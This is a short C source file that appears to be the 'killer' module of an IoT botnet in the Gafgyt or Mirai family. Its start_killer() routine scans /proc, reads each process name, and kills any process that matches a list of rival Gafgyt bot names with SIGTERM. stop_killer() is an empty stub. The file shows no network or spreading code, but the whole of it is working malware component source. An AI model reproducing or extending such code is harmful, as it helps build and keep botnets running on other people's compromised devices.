#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <ctype.h>
#include <signal.h>
#include <linux/limits.h>
#include "headers/killer.h"

void start_killer(void) {
    DIR *dir;
    struct dirent *entry;
    dir = opendir("/proc");
    if (!dir) return;
    while ((entry = readdir(dir)) != NULL) {
        if (!isdigit(entry->d_name[0])) continue;
        if (strlen(entry->d_name) > 32) continue;
        
        char path[PATH_MAX];
        char line[256];
        if (snprintf(path, sizeof(path), "/proc/%s/comm", entry->d_name) >= sizeof(path)) {
            continue;
        }
        
        FILE *f = fopen(path, "r");
        if (!f) continue;
        if (fgets(line, sizeof(line), f)) {
            line[strcspn(line, "\n")] = 0;
            for (int i = 0; i < GAFGYT_COUNT; i++) {
                if (strstr(line, GAFGYT_PROCS[i])) {
                    kill(atoi(entry->d_name), SIGTERM);
                    break;
                }
            }
        }
        fclose(f);
    }
    closedir(dir);
}

void stop_killer(void) {
    //NOOP
    // No-op in simple killer
}
